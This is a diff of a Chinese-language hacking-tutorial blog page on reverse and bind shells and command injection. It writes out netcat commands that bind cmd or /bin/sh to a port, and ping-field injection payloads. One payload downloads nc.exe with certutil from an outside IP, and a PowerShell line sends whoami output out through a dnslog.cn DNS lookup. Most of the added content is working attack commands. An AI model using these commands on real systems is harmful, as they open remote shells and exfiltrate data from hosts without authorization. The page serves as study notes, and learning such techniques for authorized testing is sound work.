@@ -186,15 +186,34 @@
 <li>反弹Shell命令</li>
 </ul>
 <ol>
-<li><p>命令生成：<a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>
+<li>命令生成：<a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></li>
+<li>优势：<br>1、解决数据回显，eg：我们输入添加用户（useradd znskiw）的命令，能看到对方回复请输入用户名的命令（enter new user：）<br>2、解决数据通讯（维持权限）<br>3、如果没有反弹shell，请求一次对方就会出现一次流量。反弹shell后对方不会出现流量</li>
+<li><strong>正向连接</strong>：我们主动去连接目标<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//绑定CMD到本地5566端口</span><br><span class="line">windows：nc -e cmd -lvp 5566</span><br><span class="line">//主动连接目标5566</span><br><span class="line">linux：ncat window的ip 5566</span><br><span class="line"></span><br><span class="line">Windows控制Linux</span><br><span class="line">//绑定SH到本地5566端口</span><br><span class="line">linux:ncat -e /bin/sh -lvp 5566</span><br><span class="line">//主动连接目标5566</span><br><span class="line">window:nc linux的ip 5566</span><br></pre></td></tr></table></figure>
+
+<strong>反向连接</strong>：目标主动来连接我们</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Linux控制Windows</span><br><span class="line">//等待5566连接</span><br><span class="line">linux:ncat -lvvp 5566</span><br><span class="line">//绑定CMD到目标5566端口</span><br><span class="line">window:nc -e cmd linux的ip 5566</span><br><span class="line"></span><br><span class="line">Windows控制Linux </span><br><span class="line">//等待5566连接</span><br><span class="line">winodws:nc -lvvp 5566</span><br><span class="line">//绑定CMD到目标5566端口</span><br><span class="line">linux:ncat -e /bin/sh windows的ip 5566</span><br></pre></td></tr></table></figure>
+<p>反向连接应用：内网主机公用一个ip。如果使用主动连接，没办法知道连的是那台主机，只能用反向连接</p>
+<ul>
+<li>利用ping获取shell</li>
+</ul>
+<ol>
+<li>用<code>127.0.0.1 | whoami</code>判断服务器系统（windows是administrator，linux是root）</li>
+<li>windows没有nc，上传nc文件，命令可以带着下载地址方便调用，eg：<code>127.0.0.1 | certutil.exe -urlcache -split -f http://1.1.1.1:80/nc.exe c:\\nc.exe</code></li>
+<li>反弹（刚刚下载好的nc调用时也要带着路径c:\nc.exe）eg：<code>127.0.0.1 | c:\\nc.exe -e cmd -lvp 5566</code></li>
+</ol>
+<ul>
+<li><p>防火墙开启入站策略，采用反向连接；防火墙开启出站策略，采用正向连接</p>
 </li>
-<li><p>优势：<br>1、解决数据回显，eg：我们输入添加用户（useradd znskiw）的命令，能看到对方回复请输入用户名的命令（enter new user：）<br>2、解决数据通讯（维持权限）<br>3、如果没有反弹shell，请求一次对方就会出现一次流量。反弹shell后对方不会出现流量</p>
+<li><p>漏洞有，但是数据不回显：</p>
 </li>
-<li><p><strong>正向连接</strong>：我们主动去连接目标<br>Linux控制Windows<br>&#x2F;&#x2F;绑定CMD到本地5566端口<br>windows：<code>nc -e cmd -lvp 5566</code><br>&#x2F;&#x2F;主动连接目标5566<br>linux：<code>ncat window的ip 5566</code></p>
-<p>Windows控制Linux<br>&#x2F;&#x2F;绑定SH到本地5566端口<br>linux:<code>ncat -e /bin/sh -lvp 5566</code><br>&#x2F;&#x2F;主动连接目标5566<br>window:<code>nc linux的ip 5566</code></p>
-<p><strong>反向连接</strong>：目标主动来连接我们<br>Linux控制Windows<br>&#x2F;&#x2F;等待5566连接<br>linux:<code>ncat -lvvp 5566</code><br>&#x2F;&#x2F;绑定CMD到目标5566端口<br>window:<code>nc -e cmd linux的ip 5566</code></p>
-<p>Windows控制Linux<br>&#x2F;&#x2F;等待5566连接<br>winodws:<code>nc -lvvp 5566</code><br>&#x2F;&#x2F;绑定CMD到目标5566端口<br>linux:<code>ncat -e /bin/sh windows的ip 5566</code></p>
-</li>
+</ul>
+<ol>
+<li>带外查询<br>  使用网址<a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a><br>  <img src="/2023/07/15/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/11.png" alt="11"><br>  在ping的时候带上这个网址，就会在那个网站上显示出来<br>  <img src="/2023/07/15/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/22.png" alt="22"><br>  但是因为反引号命令是linux里的，所以windows无法使用<br>  windows要使用powershell变量赋值，并且\会影响ping，所以我们可以构造<code>127.0.0.1 | powershell $x=whoami;$x=$x.Replace(&#39;\&#39;,&#39;xxx&#39;);$y=&#39;.q8wzba.dnslog.cn&#39;;$z=$x+$y;ping $z</code></li>
+</ol>
+<p>  <img src="/2023/07/15/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/333.png" alt="333"></p>
+<ol start="2">
+<li>反弹shell</li>
 </ol>
 
                 </section>
